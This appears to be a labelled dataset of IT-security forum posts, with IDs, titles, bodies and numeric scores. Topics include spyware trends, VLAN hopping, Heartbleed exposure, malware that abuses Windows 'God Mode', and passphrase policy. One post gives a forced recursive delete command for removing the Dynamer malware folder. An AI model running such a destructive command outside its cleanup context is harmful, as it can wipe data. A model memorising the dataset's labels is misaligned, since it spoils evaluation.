but also including measures to hunt down possible attacks through data collection and analysis, he adds.Spyware Makes A ComebackCisco found that in the first half of this year, attackers altered their methods of delivering, hiding, and evading their malicious packages and techniques.Fileless malware is popping up, which lives in memory and deletes itself once a device restarts, according to the report. As a result, it makes detection and the ability to investigate it more difficult.Additionally, attackers are also making use of anonymized and decentralized infrastructures, such as Tor proxy services, to hid command and control activities.Meanwhile, three families of spyware ran rampant, with Hola, RelevantKnowledge, and DNSChanger/DNS Unlocker affecting more than 20% of the 300 companies in the sample for the report.Ironically, however, many companies and organizations underestimate or virtually dismiss spyware. ""Spyware is being disguised as adware and adware, unlike spyware, does not create damages for a company,"" says Franc Artes, Cisco's Security Business Group architect. He adds that attackers are injecting spyware and other forms of malware into adware, since adware is a low priority for security teams.CEO Fraud Prevention Manual DownloadCEO fraud has ruined the careers of many executives and loyal employees.

That said, my dad runs a small business with around 4 PCs that doesn't have the benefit (or need) of a domain environment. Their main line of business application is hosted off site, so locally all they do is file and print. I have a Synology DS213+﻿ setup with 2 2TB HDDs in RAID1 which replicates offsite to Amazon Glacier. They have 2 mapped drives - 1 for documents and 1 for pictures. These drives are connected via persistent drive maps that are separate from their windows account credentials. Curious if cryptolocker/wall/etc. would infect these mapped drives? I am under the impression that it just uses the users' rights and encrypts that data.Their PCs are backed up separately via Acronis to another network share (which uses Acronis specific credentials), so they would be safe in the event of an infection anyway.Thanks,David",0

Well randomly about two weeks ago at various times of the day (but seems to be increasing in frequency) the speakers suddenly output some radio signal! It actually comes in fairly clear, usually a talk show or a commercial or even music is heard. It only lasts a numbers of seconds and then goes away.Thinking this was faulty power cord or wiring in the speakers, I just bought a really nice two-speaker set from Creative and hooked that up. And the radio signal continues! My suspicion at this point is that the rouge signal is coming from the the APC UPS that the speakers are plugged in to.

229735,Untagged VLAN Security,"Hi all,I'd like to confirm a switch VLAN configuration to be secure or not.   Please let me know your thoughts.I'm using Netgear switches (GS724T/TS/TPS) and have either standalone or stacked setups in various locations.  I want to use them for more than just a LAN switch but also some other purposes where I don't want the traffic having a path to the LAN so I've created untagged VLANs for some ports.   I've changed the PVID on said ports to respective VLANs then changed the membership of those ports to only belong to the respective single VLAN.I would like to confirm that there is no chance of intra-VLAN communication by way of hacking (such as VLAN hopping) in the following scenario.-A stack of 2 GS724TS switches connected via HDMI stacking.-Ports 1-12 on both switches only belong to PVID/VLAN '1' and are untagged members.-Ports 13-24 on both switches only belong to PVID/VLAN '20' and are untagged members.-All ports have membership in  only 1 VLAN  (no dual membership).Any feedback is appreciated - thanks!EDIT  (I may not have presented my info above clearly): Ports on VLAN 20  DO NOT belong to VLAN 1 - they have been removed as well as ports on VLAN1 DO NOT belong to VLAN20.   For example I cannot ping  a system from VLAN1 to VLAN20 (or vice-versa) which are on the same logical subnet so this proves communications are working as I would expect.  I'm more concerned about hacking (Vlan hopping), but I think this is only possible if the packets are tagged which this this is not.  My understanding is untagged VLAN happens inside the switch which makes it more of a physical port security. Also, Netgear has confirmed this configuration to be free from exploit, but I would rather not trust a mfg to speak about their own solution in a negative way.  I'm looking for theoretical ways to get around this setup as I have not found a way to do it.",11
354957,Access cards for time punch card and validate security round,"I've been tasked with setting up a time punch card machine for employees and also make sure security guards actually do their rounds.  Right now, employees just manually fill in a time sheet and ""say they do their hourly rounds"".  New management wants to be sure no one clocks in for someone else and security guards are doing what they are paid to do.Since I will be upgrading their whole security system (including cameras), I was thinking of using access cards for the employees to clock in/out.  At the end of the week, HR can simply export the data from the machine.  As for the security guards, I want to put a magnetic (or RFID) strip by all the doors and areas that they must patrol every night.  Each time they reach that zone, they need to scan the magnetic strip/rfid which automatically records time and date on their handheld device.  BTW, I don't want to run any wires to those zones so passive devices must be installed in the zone.  Then at the end of their shift, the unit is docked and data is sent.  Is there an all in one solution for both time clock and security rounds?  Eventually, we hope to use the same access cards to replace the current key card system to access different secured areas.  This business is an apartment complex that currently has magnetic cards (like credit cards) to unlock all doors.  A very simple off ebay card cloner can clone the cards.  The door locks are not linked to a central system so if a card is lost, the programming machine must be inserted into the lock, wipe out all the active cards (except for the master), then reprogram new valid cards.  If a master card is lost/stolen, then the programming machine has to ""touch"" every single lock in the building to have it reprogrammed.  There is about 250 door locks yikes!  The door lock system replacement will come later on.",11

1594306,New malware abuses Windows' God Mode to evade detection,"Security researchers at McAfee have discovered a new variant of the malware called Dynamer that takes advantage of the Windows ""God Mode"" easter egg to hide itself from users. God Mode, a feature that has been present in Windows for the last decade, is ""a collection of useful control panel options options in a 'folder.'"" ﻿To access it, users create a new folder and then name it ""GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}."" Once a user has done that, the folder ""will no longer have a folder icon and in fact, the system treat﻿s these directories differently than a regular folder."" The newly discovered malware takes advantages of this feature. According to ExtremeTech, ""When it’s installed on a system, it deploys itself in the AppData directory and places itself in a master control panel directory similar to God Mode."" When users try to track down the malware infection, ""the modified folder just links back to RemoteApp and Desktop Connections control panel item with nothing of interest."" But McAfee researchers found that the malware goes one step further, ""using the folder name 'com4.{241D7C96-F8BF-4F85-B01F-E2B043341A4B}.'"" When folder ﻿﻿or files are given a ""com4"" name, Windows grants them increased privileges and treats them as a device — this leaves it ""immune from standard console and file management commands."" Even though it takes advantage of ""Windows' oddities"" to evade detection, Dynamer is relatively easy to remove by first killing the process with Task Manager and then running ""rd “\\.\%appdata%\com4.{241D7C96-F8BF-4F85-B01F-E2B043341A4B}” /S /Q"" in the command line﻿. ",0
883268,Three in four companies are still vulnerable to Heartbleed – are you?,"A report from the key-management firm Venafi has discovered that 74% of Fortune 2000 businesses are still vulnerable to the aftershocks of Heartbleed, which include ""the fraudulent use of encryption and certificate keys stolen in the days following the disclosure of ... the vulnerability."" According to eWeek, Venafi's report shows a 2% improvement in the last eight months among Fortune 2000 businesses. Even though the majority of these companies have patched their systems, nearly three-quarters are still using vulnerable Secure Socket Layer (SSL) keys and certificates. These companies are consequently at risk of system breaches and attacks. The OpenSSL Project publicly announced the discovery of the vulnerability exactly one year ago today on April 7, 2014. After its discovery, ""researchers were able to show that passwords, secure data, and private cryptographic keys could all be retrieved remotely"" with a simple attack. An engineer at the Finnish cybersecurity company Codenomicon named the vulnerability Heartbleed soon after﻿. While many companies immediately moved to patch Heartbleed, attackers were able to recover an unknown number of keys and certificates. Companies were advised to ""reissue new certificates [and] ... generate a new private key"" to fully secure their systems. The effects of Heartbleed have included the breach of health care provider Community Health Systems in August, where more the 4.5 million records were stolen, as well as the ""uptick in attacks on health care companies and hospitals ... according to security firm Websense."" According to eWeek, 1,639 Fortune 2000 companies ""have systems that were vulnerable to Heartbleed, and 1,223 ... have not completely remediated the issue."" ",1
1829549,Running An IP Based Security Camera System On A VM,"Just a thought and a question.What do you think the performance would be if you ran a 14 IP camera based security system on a VM?  Have you ever run a security camera system on a VM?  I have never done this and am wondering it this would work efficiently.  Granted a lot of factors depend on the camera settings themselves, but as a general question these settings are not in the equation.I know of a person who is currently running their security camera setup on a physical Windows Server 2012 R2 with 2 - 3 GHz processors, 16 Gigs RAM and a 500 GB RAID 10 system.  They have other functions on this server, (not a DC) and was thinking of adding yet another smaller server to run this system so they could pull it from this server but I question as to whether or not they could be run on a VM?  Yes, it would still be on the same physical server, but my question is would it work?I think I am going to experiment and try it but would still like the input of others here.   ",0

305675,Security firms slow to react to spear phishing like that used in China hack,"Antone Gonsales at the CSO site hits the nail on the head: “Email security vendors have failed to do enough to protect customers against advanced cyberattacks like the one recently linked to the Chinese military, experts say.“Vendors have needlessly left customers exposed to spear phishing, which is the most effective way hackers have of penetrating corporate networks. The technique involves scouring the Web for information related to the target in order to craft an email most likely to trick the person into clicking an attachment or visiting a malicious website.“The players that have had email and Web security solutions have failed at their job,” Rick Holland, an analyst at Forrester Research, said on Wednesday.The result has been successful spear phishing-based cyberattacks like the one recently uncovered by Mandiant. The security vendor this week released a 60-page report that traced an advanced cyberespionage operation to a Chinese military unit.Researchers at the Georgia Institute of Technology are working on analytics that they hope will one day be able to spot bogus email and warn recipients. Before starting the project, research scientist Andrew Howard investigated the market last year and found only one vendor that he believed had reliable analytics.“The technologies available out there to help with this problem are severely inadequate,” Howard said.Which brings me to the point of all this. An essential part of your ‘defense-in-depth’ strategy is security awareness training because your security software cannot keep up with the bad guys.Full article here.",0

1944077,Beyond signatures - the latest evolution of CyberCapture,"We've got some amazing tech on which the geniuses at HQ and our Threat Labs have worked tirelessly to protect our users.Today, our CTO Ondrej Vicek published an awesome blog on exactly how we're doing this, and what runs behind the fancy-sounding but accurately named CyberCapture -- as well as some new updates.It's really a great read, but for those short on time I wanted to hit some of the key points. Still kind of long, but I hope it helps:At its core, CyberCapture detects unknown or potentially malicious files, isolates them (capture) so they cannot do damage, then establishes two-way communication with our Threat Labs for analysis.Once captured, our labs can analyze the code of the malware, stripping away techniques malware authors use to hide their true purpose.This also enables behavior analysis of the malware to isolate its processes and intentions.CyberCapture itself uses several underlying techniques:Malware Similarity Search: An accurate, intelligent process specifically designed to look for files similar to known threats.Signatures: These are still valuable -- signatures are vital in certain locations and situations, e.g. computers in areas with unreliable Internet connections, or those that are offline and mainly receive data through flash or removable media. Signatures also help to make overall analysis faster and more efficient, as they can incorporate data from our other algorithms and processes as well as a whitelist.Evo-Gen: An algorithm that is vital for analyzing huge data sets and identifying malware, even if scattered.NG: NG technology focuses on behavioral analysis of malicious files, and feeds into the central threat database used across Avast products. This isolated analysis is very difficult for the bad guys to fight against.Finally, Ondrej details some updates to the newest version of CyberCapture:Simzilla (what a fun name!) which blends similarity checks and behavior analysis to help intelligently classify potentially malicious filesReal-time clustering and classification (what a mouthful!) which leverages machine learning (buzzwords!) in tune with behavior analysis to discover new families and subtypes of malware -- especially in conditions where the samples are short-lived.For those really looking to dive into the details, here you go!https://blog.avast.com/an-in-depth-look-at-the-technology-behind-cybercapture",0

I have tried contacting them several times last Wednesday to help with the installation of the new Backup Exec 2010 which we had upgraded to from 11D. I was on hold with them for over 58 minutes when I received an email saying they tried to contact me. After sending several emails asking for a manager to contact me and forwarding the emails to our vendor, I get a call at 4:58 PM. I said that was too late to troubleshoot because backups were going to be starting soon. I asked that they call back the next morning between 9:00 and 9:30 but they did not call until 10:15. He had me back up some files but that was going to take about 25 minutes so he said he would call me back at around 11:00. I told him that I would be in a meeting from 12-1 but he called me at 11:55. I emailed him at 1:06 saying I was back at my desk and then again at 2:25 I requested he have another tech call me because I cannot wait any longer.After finally getting a hold of a tech, Backup Exec 2010 was successfully installed. They had not seen this error before but the problem was related to a corrupt .net installation.The next morning I looked at the backups and only 1 server had backed up successfully. After calling into tech support they identified the problem as the agents not installing properly, even though all installation indicators were of a success although some servers needed a reboot.The next day, (last Friday) 6 servers failed to backup so I contacted Symantec again to get this resolved. This time I got a very nice and professional individual (David L Frye) who I could clearly understand. We worked together for several hours and all appeared to be working fine but the true test was the weekly backups over the weekend.I checked Saturday morning and no backups were running. We have a 2 drive tape robotic library and neither drive was active. I had 2 jobs in the queue but nothing was running.After calling in again, I was told that Symantec changed their licensing so now we needed to purchase a LEO - Library Expansion Option because we have 1 library but 2 drives and you only get 1 drive for free. My question to them was why didn't the backups work on 1 drive and they could not answer that except to say they would forward my question to the development team. I also suggested they forward this idea: if I was in the process of upgrading and the licenses did not match what I had then either let me use the unlicensed item for 30 days, or have a popup appear letting the user know about the discrepancy. That way they could decide to postpone the install until they had everything.So we hurried up and bought the LEO (~$720) so we could use both drives.Now I only have 2 servers that fail to backup, a web server and an Oracle server. I called in this morning to get these resolved and worked with someone that was fairly easy to understand and he had me try a couple of things but then said he had to escalate the issue. I was on hold for almost 3 hours and finally gave up. Why are some companies like this?I have told our director of IT that come time to renew next year I will have many backup and antivirus solution alternatives to present to him.Sorry for the rant, but I just had to get this out of my system...",0
576316,Customer Cyber Security Questionnaire Review - What to Expect,"One of the manufacturing company sites under our corporate umbrella does a great deal of business with a specific customer that has asked us to fill out a cyber security questionnaire.  This is about 30 questions covering asking whether we have a firewall, if we have a web filter, if we perform full packet capture, if we have the capability to remote wipe devices containing sensitive information, if the company has a dedicated cyber security team, etc.  All of these are yes / no questions and do not require detailed answers.We filled this out for the first time back in 2012, and we have now been called to meet with the customer's security team to ""verify"" our answers.  I looked at it again yesterday along with our answers and realized there have been some changes to our answers (some to better security, which is good), but I'm not quite sure what to expect.  We don't have to be PCI compliant or anything like that, but I believe ITAR applies to some of the information we get from the customer.To give some background on the customer...We have to be on a site-to-site VPN with this particular customer and utilize OTP technologies for specific sensitive information to which we need access (drawings and specifications, etc.).  People have to go through background checks to get access to the systems that use OTP. They do a pretty good job of keeping security pretty tight for their information, but as you could guess, they are interested in how we protect and secure our environment.  I plan to meet with the QA manager at this site to go over the answers and a basic overview of our environment, but I am wondering how detailed the questioning will be from the customer and where things will go from there.  I do not believe this is a full-blown audit, but I suppose it could be eventually depending on how things go.",0

We went with Vipre because we wanted a more managed solution to help spread the workload since we are pretty understaffed (Typical IT situation). Having constant issues pop up isn't something we can stay on top of 24/7, and since it has to deal with security this concerns us.We're in the process of switching over to Panda Security. Their cloud based security has been awesome during testing. The price doesn't seem so bad either, just a little higher than what Vipre sold us. I just wanted to see if anyone is currently using Panda Security and can give some feedback on their system. We currently really like them but don't want to sign another agreement if it's going to be another repeat of Vipre. Any info is appreciated. Thanks!",5

1986705,Encrypted messaging and open source,"This article is more of a ""discussion"" than a focus on one topic, but I found it interesting as it really brings up more questions than answers.Basically, encrypted messaging has really gotten even more mainstream awareness lately, from WhatsApp to Signal. What I was less familiar with was the Wickr service -- more of an enterprise collaboration market than personal use (although they do have a personal app.) A few months ago, they opened up their source code -- Signal had done the same, which gave them a big awareness boost.The article also discusses how usability and UI/UX is becoming even more important to the encrypted messaging world -- which makes a lot of sense, given its spreading and increasing appeal. I'm a devout Signal user myself, and have seen several updates come over which even included an update to the app icon... which I don't care about, but someone must!https://www.the-parallax.com/2017/04/21/encrypted-messaging-open-source-success/So, I know I've posed this question before, but I'm curious if the landscape has changed. How many of you have switched to an encrypted messaging app?",0
458794,No Antivirus Detects Russian Malware For 8 Years!,"﻿It was all over the news the last few days. Researchers with BAE Systems determined that Russian malware known as Snake dates back as far as 2006, instead of 2011 as initially presented by a German security company G Data.Germany-based G Data SecurityLabs released a ""Red Paper"" last week explaining that Snake (also called Uroburos) is a rootkit, composed of two files, that is able to take control of infected machines, execute arbitrary commands, hide system activities, and, ultimately, steal information and capture network traffic.This apparently is the Russian equivalent of the U.S-Israel StuxNet/Flame malware, and even more adept at hiding itself. Would you believe it that -no- antivirus product prevented, detected and/or removed this for 8 (!) years? It's a scandal, what are you paying hard-won budget dollars for every year?I'm sorry to say it, but antivirus cannot keep up with more than a million malware variants every week. It's time to do a ""180"" and instead of keeping the bad guys out, only allow ""known-good"" to run. It's known as whitelisting and as ""Application Control"", and it would prevent all those state-sponsored super-nasties to run, let alone run of the mill malware.Five years from now, everybody will be whitelisting, and scratch their heads asking themselves: ""Why didn't we do this 10 years ago""? It's only a matter of time before we find out how it infected the target workstations, and it wouldn't surprise me if social engineering was one of the ways.  Tell me what -you- think? ",0

2083111,Cheap security camera systems on Amazon vs Raspberry Pi with MotionEyeOS,"I have been asked to install a security camera system for the warehouse in our office. We will need four cameras for this project. I am aware of the dozens of IoT cameras on the market, but I have a no-IoT-devices allowed policy in our office for security reasons, so I am down to two options. There are several security camera systems on Amazon such as this one here (https://smile.amazon.com/ZOSI-Security-recorder-Weatherproof-Smartphone/dp/B00MP57IOY/ref=sr_1_3?s=e...) that comes with four cameras and a 1 TB hard drive in the recorder unit.

However, the total cost of all of the Raspberry Pi setup will be almost $300 when all components are factored in, whereas the cheap off-brand security systems on Amazon can go as low as $85. However, actually setting up the Raspberry Pi from scratch allows me to control more aspects of the actual software. From a security and functionality standpoint, is there a solid reason for why I should not consider those cheap camera systems and build a Raspberry Pi system instead?",0

36897,VPN Security Question--SSL vs. IPSEC,"We would like to start giving people remote access to their corporate computer via a SSL VPN. In thinking this through I'm not sure of the security implications. I understand the risks of the traditional IPSEC VPN connection because it ends up looking just like a standard network connection once the tunnel is established. Infected VPN client computers are free to do their thing on the network. Does the same thing apply when the VPN is SSL? In other words, is an infected computer just as likely to infect an internal network when connected via SSL VPN as it is when connected via the IPSEC client? Is the traditional virus/trojan (if there is such a thing) thwarted by a SSL connection?Currently we maintain some control over the VPN clients by having corporate A/V software that communicates with a management console, so we have a good idea on the state of that client computer. We wouldn't necessarily have that control on every computer that a person may want to use to connect via SSL. I thought one of the main benefits of using a SSL VPN was to have something much more scalable that didn't necessitate the installation of client VPN and A/V software. As I think it through I'm not sure if using a SSL VPN in this manner is prudent. Do most companies using SSL VPNs use some sort of control mechanism such as NAC to enforce client computer security? If so, doesn't that somewhat reduce the benefit of using the SSL VPN? TIA",0

2018306,Implementing SEDs and/or TPM based encryption on Windows Server 2008r2 with RAID,"Hi All, I'm hoping someone can help me out here.  A doctor's office I do work for is upgrading their drives to SSD for both a space increase and a speed increase. I was going to keep it simple and just do a straight re-image of the data to the new drives, but the doctor spoke to a friend and is interested in implementing encrypted drives.  I'm somewhat familiar with basic bitlocker implementation as I set it up on my laptop, but I'm unsure what I need to consider when looking into drive encryption on a server. The configuration is:Proliant Server ML350 r6 *w/o* TPM module (would have to purchase and install)Server 2008 r2RAID5 using internal RAID controller, not s/w RAID (3 physical drives, moving to 4 physical drives)So my questions are:My understanding is that once a TPM is in, it is in for good.  So, if I pull the old hard drives,install the TPM, install the new hard drives, restore the image, encrypt the volume with bitlocker, and I run into a problem, can I still just put the old drives back into the system and be fully functional again?How is MS's server backup imaging software affected by TPM?  by SEDs? Can I still do an image restore to new drives in the event of a catastrophic failure?  What is the procedure for disaster recovery of a system board failure, single drive failure (hardware RAID), other failures such as OS corruption?How does the TPM module affect system f/w updates, drive replacement, and OS updates on a Proliant server? I only ask because the prolaint documentation says, ""When a TPM is installed and enabled on the server, data access is locked if you failto follow the proper procedures for updating the system or option firmware, replacing the systemboard, replacing a hard drive, or modifying OS application TPM settings."" It makes it sound as if a single misstep will lock you out. Is this the case?Are SEDs a better option than TPM with bitlocker?  Can SEDs work in a hardware-RAID configuration? Can SED work with the TPM to make drive encryption more transparent?A requirement would be that the server boots as normal and does not require user intervention such as typing a password or inserting a usb key.  My understanding is that bit-locker along with TPM will allow this, but how about SEDs?Any other sites with no onsite tech support that have implemented encrypted drives in their server? How did you do it, how is it working?Any thoughts, suggestions, or help is greatly appreciated.  Thanks,Jeff",0

235082,Scam Of The Week - Never ‘check’ your password. Change it!,"Never ‘check’ your password. Change it!   ( Send this to your users)The last few weeks, it came to light that some major websites were hacked and millions of passwords were leaked. LinkedIn is only one of them. A few hours later, a website appeared called LeakedIn, that allowed you to enter your password, they then encrypted it the way LinkedIn did, and compared it to the list of stolen passwords. A red light meant that your password was stolen. There is something very wrong with checking if your password was leaked. First of all, who are these LeakedIn people? Could be a social engineering trick to get your password! Worse, they might be well-meaning but what about the bad guys compromising their website?If there is credible news that a website you often visit has been hacked, and passwords leaked, use your bookmark to go to that website and change to a strong password or passphrase. And please note, if you get an email that looks like it is from one of your fave websites, states that you need to change your password, and has a link to click on, NEVER CLICK THE LINK. This is very likely to be a phishing email. Always use your own bookmark or type in the name of the site in your browser’s address bar. That way you rare sure you are on the actual site, instead of a fake. To end off, while you are at it, if you have used that same password on other sites, go there and change the password as well.-- (Up to you to add or delete this last section) --Yes, I know it is hard to keep track of all these sites and passwords, so we all tend to use the same password all over the place.

292538,Passwords: The security tool that loves to be insecure,"This is the 148th article in the Spotlight on IT series. If you'd be interested in writing an article on the subject of backup, security, storage, virtualization, mobile, networking, wireless, DNS, or MSPs for the series PM Eric to get started.Passwords: Love them or hate them, they are a reality we all have to deal with every day of our lives. We have spent at least the last decade training users to use complex eight-character passwords that are hard for humans to remember yet easy for a computer to break. Many of us are aware of this issue already but may not be sure why this is. We are also aware that we should be training users to use passphrases, but for some reason we haven’t pushed to implement this in our work environments and continue to use the old complex eight-character passwords.At my workplace, we’re currently looking at implementing passphrases instead of eight-character passwords and are looking at changing the requirement that users create a new password every 90 days to be every 365 days. That’s right — I said one year!My manager has already agreed and is completely onboard. We just have to meet with our auditors and convince them before we implement this policy. I’ll get into why we’re pushing to change the password policy from 90 days to one year, but first let’s talk passphrases/passwords.A regular complex password is typically eight characters long and requires a mix of uppercase, lowercase, a number and a character — all which can be very confusing to the user. They put all this time and energy into creating one of these passwords that they can actually remember (usually they still forget it) and then 90 days later we make them do it all over again like some sort of sadistic mind game. And for what? These passwords can be brute forced by a high-end custom gaming computer in an average of four hours and no longer than eight hours. That seems like a lot of suffering for very little return to me.Of course, this is based on an offline attack where the attacker managed to download your password database (that would never happen, right?) and is free to work on it as fast as the hardware they can acquire will allow. In most cases, a hacker will have to use an online brute force where they are trying to break into a public portal of some sort (OWA maybe?). In this case, with our current infrastructure they will normally be limited to 1,000 guesses per second (assuming no account lockout policy or other defenses) and it would take them a maximum of 2.13 centuries to crack that password. The key is the maximum amount of time involved using a brute force attack. The average will be much lower — especially if your users think they are clever. In fact, most passwords are cracked in only a few hours!How clever is clever?That raises the question, what is a clever user? In this case I mean using what we as humans think of as character replacement and lookalike characters: passwords such as “Compl3x!,” “P@ssw0rd” or “M0nk3y12.” I mean, what computer could be smart enough to replace an “E” with a “3” or an “O” with a “0”? Well, the answer to that question is all of them — due to massive password databases containing millions of passwords being leaked to the Internet in recent years. LinkedIn or RockYou.com, anyone? Hackers have been able to analyse users password habits and improve their algorithms to take these into account. This means that almost every “clever” password trick you use to make a password makes your password about as secure as using a dictionary word.In the recent case where the LinkedIn database was leaked, a guy sitting at home running a high-end gaming machine he put together that could make 15.5 billion guesses per second was able to crack 20 percent of the LinkedIn database’s user password in 30 seconds and 55 percent within two hours. After five days he had cracked more than 80 percent of the passwords in the LinkedIn database — a database containing 6.4 million passwords.12 is the magic numberThe end result of all of this is that the only way we have left to ensure our passwords are secure is to use length. The longer a password the more secure it is (well, duh). And if we want to use length and still have a password that a user can remember that means we need to start using passphrases. A simple passphrase such as “My dog is Purple” is much more secure than an eight-character complex password such as “Compl3x!.” The magic number is currently 12-characters long. Anything over 12 characters becomes effectively impossible to brute force with current technology. But the beauty of passphrases is that they make it very easy to use very long passwords and still be able to remember them. My example “My dog is Purple” is 17-characters long and contains complexity (expect for missing a number), but you have probably already memorized it just by reading this article! That is five characters longer than the magic number of 12. Let’s compare the two:Compl3x!Length: 8Depth per Character (Alphabet): 95Possible # of Passwords from this character set: 6,704,780,954,517,120Time to break offline with a customized home machine: 8 hoursTime to break online (1,000 guesses per second): 2.13 centuriesTime to break offline with a massive cracking array: 1.12 minutes My dog is Purple.Length: 17Depth per Character (Alphabet): 85Possible # of Passwords from this character set: 638,647,735,780,430,975,006,148,928,687,685Time to break offline with a customized home machine: UnknownTime to break online (1,000 guesses per second): 200 million trillion centuriesTime to break offline with a massive cracking array: 2 billion centuriesWe also like to force users to change passwords every 90 days of so. This is another behaviour that doesn’t really gain us much security but sure goes a long ways towards helping users hate passwords and ensuring they can’t remember them. The reason that this doesn’t really gain us any security is because it is only 50 percent effective, and for security to work it has to be 100 percent effective.Let’s use an example password of 500. This password exists in the possible range or 1 to 1,000, so it is exactly in the middle of the password space. If a hacker were to attempt to brute force this password, his algorithm would start at 1 and count up, checking every possible value. Now let’s pretend the hacker has been running his brute force attack for a few days and is at the value 499. It also happens at this point that our user runs into our 90-day password expiration and has to set a new password. At this point one of two things will happen.The user will create a new password, and it will end up being above or below the point our hacker’s attack is currently at. If the user picks a point below 499, say 100, then they were unwittingly successful in thwarting the brute force attack. However this will only happen half of the time.The other half of the time the user will pick a new password above 500, say 750. In this case the password change has no effect at all on the existing brute force attempt and we have gained no security improvements. The hackers brute force attack will continue and he will crack the user’s password and gain access to our systems. So in this case we have forced our user to change his\her password and re-memorize it for nothing!We can extend the time it takes to brute force a password exponentially further by adding a few simple policies to our user’s accounts. For example, if we set a wrong-password lockout policy that locks the account out after 10 wrong attempts and leaves the account locked out for four hours we will have reduced the maximum guesses a hacker could make in an online scenario to 21,900 per year! This combined with a passphrase will effectively make a brute force attack useless.In conclusion, with a few minor changes to how we implement our password policies and how we train our users to create passwords we can make both our lives and the lives of our users much happier while exponentially increasing our password security.What sort of password/passphrase requirements to you implement with users?

1956705,Testing IPS filtering on a router,"We have a Cyberoam CR15iNG router, but I'm thinking something like this might pertain to other router models as well.We have a subscription to their IPS filtering. It is supposed to block malicious or suspicious outgoing traffic. I am looking for a way to test this. Testing their other subscription services like web filtering and spam filtering is pretty simple, but I'm not sure how to test their IPS filtering. I have contacted tech support but their response is simply:""There is no method to check if its working according to policy or not, its match signatures in packet.If you want to test you can try to send any signature matching traffic on cyberoam on your risk.""A bit lacking...Does anyone have any suggestions on how to test this? There look to be thousands of signatures - too many to list here and honestly too many to go through by hand. I am hoping there is something out there that can simulate or honestly even duplicate malicious traffic that should be blocked by the average IPS.Even perhaps a virtual appliance I could install on an isolated network?Thanks",5

1433369,5 Keynotes from the ENISA Guide on Vulnerability Disclosure,"Over the last few years, there has been a rise in the number of vulnerabilities that have been publicly announced. According to a “Good Practice Guide on Vulnerability Disclosure” by European Union Agency for Network and Information Security (ENISA), published in December 2015, the volume of vulnerabilities reported in 2014 represents a year-on-year increase of approximately 53% relative to 2013. Several high-profile vulnerabilities reported to the public in 2014, such as Heartbleed, POODLE, Shellshock and Sandworm, had far-reaching consequences and, therefore, re-opened the discussion on vulnerability disclosure procedures in general.As the threat landscape continues to evolve, it becomes extremely important that stakeholders address these challenges and adopt vulnerability disclosure practices that can help minimize damage and strengthen security: 1. Use existing documents. Official documents, such as Organization of Internet Safety document (OIS) and ISO standards, often provide a set of useful guidelines on how to carry out responsible disclosure and set up a viable vulnerability disclosure policy. To avoid reinventing the wheel, it is essential for key stakeholders to refer to these documents when creating a vulnerability-handling scheme; at the same time, the community needs to enhance availability of these documents to stimulate improvement of disclosure practices. 2. Facilitate effective communication. This practice consists of three sub-practices. Firstly, vendors should have a clear and reachable point of contact to deal with vulnerability reports in order to prevent reporters from spending time and resources searching for a right contact. Secondly, vendors should have a viable disclosure policy in place and ensure it contains information about the primary point of contact, information required from reporters, vulnerability response mechanisms and timeline of the process. Finally, regular communication with key stakeholders will make the disclosure process more transparent and manageable, as well as ensure it does not lead to unexpected outcomes. 3. Disseminate information about vulnerabilities. With respect to regular users of products or services, spreading information about vulnerabilities is vital. Details about the vulnerability and its solution, if available, should be disseminated to inform users of any developments and give them an opportunity to protect themselves. The decision on how much information should be made public depends on a particular case and should be agreed to by all stakeholders. 4. Address vulnerabilities on a timely manner. There is a consensus among practitioners that timelines are a vital part of vulnerability disclosure. Without timelines, certain vendors may postpone fixing vulnerabilities indefinitely. Providing vendors with short embargos for the development of a solution makes them act more efficiently, since they cannot just “sit” on a vulnerability for months without any response. Additionally, to reduce risks associated with disclosure of unfixed vulnerabilities, vendor community and reporters need to work towards an agreement about reasonable timelines to address a particular problem.5. Ensure flexibility in reporting and disclosing. Since the “one size fits all” rule does not work in case of vulnerability disclosure, flexibility in terms of the way a problem is reported and subsequently treated becomes essential. Flexibility, just like responsiveness, ought to be a two-way street to ensure there is common ground for achievement of the ultimate outcome. As an example, flexibility is crucial with respect to patching for critical infrastructure sectors, which is more complicated and requires more time for vendors to develop a patch.﻿",12

224418,Network Drive in Business Environment,"Hi everyone, We have a business with about 100+ employees. And we have a network (Share) drive setup for all departments to store and access info. In general each department (HR, IT, Billing...) has its own folder under the root of the share drive and only members of that department have access to its contents. We have this setup by directly specifying that the Billing AD Group has access to the Billing folder. And consequently any members added to the Billing User Group will have access to that folder.However it happens often that an employee from another department (ex.from Accounting) will need to have temporary or permanent access to a file or folder that belongs to and is located in another department's directory (ex.from Billing). Right now we solve that problem by either:1. Adding the Accounting employee to the Billing User Group, but that gives the accounting employee access to ALL billing files and folders. Which we do not want to do for reasons of confidentiality.2. OR we give the accounting user access to the specific file or folder and then give them a shortcut that links to that folder or file directly. That is fine when its only a file or a folder with not too many files, but when its a folder that contains thousands of documents, it will take sometimes 15 to 30 mins to process all the permissions for all documents.

Jakub hinted that we may only have seen the beginning of the WannaCry saga, this is evidence of that occurring right now.While Adylkuzz is not new (our labs first spotted it in April with a blocked attack in the Ukraine) but since then we've blocked 92,000 infection attempts -- meaning the attack has definitely been stepped up.Jakub notes that Adylkuzz is infecting machines with the same exploit as WannaCry, but is even more insidious in that it doesn't require user interaction such as a phishing email to work. It also blocks other malware attempting to use the same vector, and isn't the first time we've seen that either.Adylkuzz is, however, not ransomware like WannaCry -- instead (and this gets very detailed in the writeup) it forms a massive cryptocurrency mining botnet to suck your computers' cycles, and line someone else's pockets.

1627712,Choosing a security consultancy,"I was looking through some of my archives and came across this article I wrote back in 2010 on how to select a security consultancy. Are any of these still relevant today? Do you have any tips on how to select a security consultancy, MSSP, or partner?---There are hundreds if not thousands of “Indian Restaurants” dotted around London. However, we all know that most of these places are not owned or run by Indians at all. You have a large number of Bangladeshi or Pakistani’s owning and managing these establishments. But for convenience there’s an unspoken rule that the owners will advertise their food as “Indian cuisine” and customers will always refer to it as going out for an Indian.By and large, it is somewhat irrelevant whether you’re eating a genuine Indian meal or not. You just look for one that will fill you up and not burn your insides.The same traits are displayed when organisations set out to hire an infosec consultancy. There are many consultancy’s out there. Most of them aren’t even really geared towards security which results in the your organisations intestines exploding and an empty wallet.So, to help you out, here are some things to consider when choosing an infosec consultancy:Know what you wantFirst off you need to decide why you actually need an infosec consultancy. Is it because the work can’t be done in-house? Or there are confidentiality issues? Or someone at the golf course just mentioned how their infosec team can sort out all of your problems?Is it a real infosec company?Many accountants, auditors, builders, pen-pushers, retired policemen, bankers, dolphin trainers, sperm donors and benefit fraudsters have somehow positioned themselves as infosec experts. But scratch beneath the surface a bit. Is this really a security 